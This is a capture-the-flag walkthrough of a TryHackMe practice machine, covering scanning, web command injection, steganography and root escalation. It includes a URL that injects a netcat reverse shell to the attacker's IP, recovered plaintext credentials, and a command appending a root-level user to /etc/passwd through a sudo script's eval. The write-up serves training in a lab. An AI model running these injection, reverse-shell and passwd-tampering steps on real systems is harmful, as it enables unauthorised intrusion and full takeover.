@@ -1,0 +1,235 @@
+#U.A HIGHSCHOOL CTF BY THM(10.10.55.122)
+
+NMAPSCAN:
+┌──(root㉿jarvis)-[/home/jarvis/Downloads]
+└─# nmap -A -sC -sV -T4 10.10.55.122
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-14 16:16 IST
+Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 50.00% done; ETC: 16:16 (0:00:06 remaining)
+Stats: 0:00:23 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
+Traceroute Timing: About 32.26% done; ETC: 16:16 (0:00:00 remaining)
+Stats: 0:00:30 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 93.75% done; ETC: 16:16 (0:00:00 remaining)
+Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 93.75% done; ETC: 16:16 (0:00:00 remaining)
+Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 93.75% done; ETC: 16:16 (0:00:00 remaining)
+Nmap scan report for 10.10.55.122
+Host is up (0.12s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 58:2f:ec:23:ba:a9:fe:81:8a:8e:2d:d8:91:21:d2:76 (RSA)
+|   256 9d:f2:63:fd:7c:f3:24:62:47:8a:fb:08:b2:29:e2:b4 (ECDSA)
+|_  256 62:d8:f8:c9:60:0f:70:1f:6e:11:ab:a0:33:79:b5:5d (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: U.A. High School
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=9/14%OT=22%CT=1%CU=31152%PV=Y%DS=5%DC=T%G=Y%TM=66E5
+OS:698A%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)
+OS:SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW6%O2=M508S
+OS:T11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=
+OS:F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=
+OS:M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)
+OS:T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S
+OS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=
+OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G
+OS:%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 5 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 199/tcp)
+HOP RTT       ADDRESS
+1   2.34 ms   10.17.0.1
+2   ... 4
+5   137.45 ms 10.10.55.122
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 31.13 seconds
+
+
+##DIR BRUTEFORCE:
+┌──(root㉿jarvis)-[/home/jarvis/Downloads]
+└─# gobuster dir -u 10.10.55.122 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 100 -e php,html,js,css,zip,bak,cgi -r 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.55.122
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Follow Redirect:         true
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+http://10.10.55.122/.hta                 (Status: 403) [Size: 277]
+http://10.10.55.122/.htpasswd            (Status: 403) [Size: 277]
+http://10.10.55.122/assets               (Status: 200) [Size: 0]
+http://10.10.55.122/.htaccess            (Status: 403) [Size: 277]
+http://10.10.55.122/index.html           (Status: 200) [Size: 1988]
+http://10.10.55.122/server-status        (Status: 403) [Size: 277]
+Progress: 4734 / 4735 (99.98%)
+===============================================================
+Finished
+
+DIRSEARCH:
+┌──(root㉿jarvis)-[/home/jarvis/Downloads]
+└─# dirsearch -u http://10.10.55.122/assets/index.php 
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                     
+ (_||| _) (/_(_|| (_| )                                                                                                              
+                                                                                                                                     
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/jarvis/Downloads/reports/http_10.10.55.122/_assets_index.php_24-09-14_16-32-12.txt
+
+Target: http://10.10.55.122/
+
+[16:32:12] Starting: assets/index.php/                                                                                               
+[16:32:14] 404 -  274B  - /assets/index.php/%2e%2e//google.com              
+[16:33:12] 200 -   40B  - /assets/index.php/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=dir
+                                                                             
+Task Completed                                                                                                                       
+#NC for rev shell:
+http://10.10.181.109/assets/index.php/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=busybox nc 10.17.49.23 1337 -e sh
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+
+##revshell:
+www-data@myheroacademia:/var/www$ ls
+ls
+Hidden_Content  html
+www-data@myheroacademia:/var/www$ cd Hidden_Content
+cd Hidden_Content
+www-data@myheroacademia:/var/www/Hidden_Content$ ;s
+;s
+bash: syntax error near unexpected token `;'
+www-data@myheroacademia:/var/www/Hidden_Content$ ls
+ls
+passphrase.txt
+www-data@myheroacademia:/var/www/Hidden_Content$ cat passphrase.txt
+cat passphrase.txt
+"QWxsbWlnaHRGb3JFdmVyISEhCg=="  --> AllmightForEver!!!
+
+┌──(root㉿jarvis)-[~]
+└─#  wget 'http://10.10.181.109/assets/images/oneforall.jpg'
+
+--2024-09-14 20:19:12--  http://10.10.181.109/assets/images/oneforall.jpg
+Connecting to 10.10.181.109:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 98264 (96K) [image/jpeg]
+Saving to: ‘oneforall.jpg’
+
+oneforall.jpg                             100%[====================================================================================>]  95.96K   246KB/s    in 0.4s    
+
+2024-09-14 20:19:13 (246 KB/s) - ‘oneforall.jpg’ saved [98264/98264]
+
+
+
+the steghide does not support PNG files, and the file already has the JPG extension. We can try changing the PNG magic bytes (89 50 4E 47 0D 0A 1A 0A) to JPG magic bytes (FF D8 FF E0 00 10 4A 46 49 46 00 01).
+
+$ hexeditor -b oneforall.jpg
+
+$ steghide extract -sf oneforall.jpg
+Enter passphrase: AllmightForEver!!!
+wrote extracted data to "creds.txt".
+
+
+┌──(root㉿jarvis)-[~]
+└─# cat creds.txt            
+Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:
+
+deku:One?For?All_!!one1/A
+
+
+deku@myheroacademia:~$ sudo -l
+[sudo] password for deku: 
+Sorry, try again.
+[sudo] password for deku: 
+Matching Defaults entries for deku on myheroacademia:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User deku may run the following commands on myheroacademia:
+    (ALL) /opt/NewComponent/feedback.sh
+deku@myheroacademia:~$ cd /opt/NewComponent/
+deku@myheroacademia:/opt/NewComponent$ ls
+feedback.sh
+deku@myheroacademia:/opt/NewComponent$ cat feedback.sh 
+#!/bin/bash
+
+echo "Hello, Welcome to the Report Form       "
+echo "This is a way to report various problems"
+echo "    Developed by                        "
+echo "        The Technical Department of U.A."
+
+echo "Enter your feedback:"
+read feedback
+
+
+if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
+    echo "It is This:"
+    eval "echo $feedback"
+
+    echo "$feedback" >> /var/log/feedback.txt
+    echo "Feedback successfully saved."
+else
+    echo "Invalid input. Please provide a valid input." 
+fi
+
+Luckily, neither > nor / are one of the restricted characters; we can use this to write to any file we want as the root user like this:
+
+deku@myheroacademia:/opt/NewComponent$ ls
+feedback.sh
+deku@myheroacademia:/opt/NewComponent$ ./feedback.sh 
+Hello, Welcome to the Report Form       
+This is a way to report various problems
+    Developed by                        
+        The Technical Department of U.A.
+Enter your feedback:
+test > /tmp/test.txt
+It is This:
+Feedback successfully saved.
+deku@myheroacademia:/opt/NewComponent$ sudo ./feedback.sh 
+Hello, Welcome to the Report Form       
+This is a way to report various problems
+    Developed by                        
+        The Technical Department of U.A.
+Enter your feedback:
+test1 > /tmp/test1.txt
+It is This:
+Feedback successfully saved.
+deku@myheroacademia:/opt/NewComponent$ ls -la /tmp/test1.txt 
+-rw-r--r-- 1 root root 6 Sep 14 15:11 /tmp/test1.txt
+
+With our input as test > /tmp/test.txt, the command passed to the eval becomes: eval "echo test > /tmp/test.txt" and we are able to write to the /tmp/test.txt file.
+
+Using this, we can make an addition to the /etc/passwd file and manually add an user with uid and gid set to 0 ( same as the root user ).
+
+'jxf:$1$RKbxGlZy$5UoDurT/OAr.a.bX14LzW/:0:0:jxf:/root:/bin/bash' >> /etc/passwd
+
+
+deku@myheroacademia:/opt/NewComponent$ sudo ./feedback.sh 
+Hello, Welcome to the Report Form       
+This is a way to report various problems
+    Developed by                        
+        The Technical Department of U.A.
+Enter your feedback:
+'jxf:$1$RKbxGlZy$5UoDurT/OAr.a.bX14LzW/:0:0:jxf:/root:/bin/bash' >> /etc/passwd
+It is This:
+Feedback successfully saved.
+deku@myheroacademia:/opt/NewComponent$ su - jxf
+Password: 
+root@myheroacademia:~# ls
+root.txt  snap
+
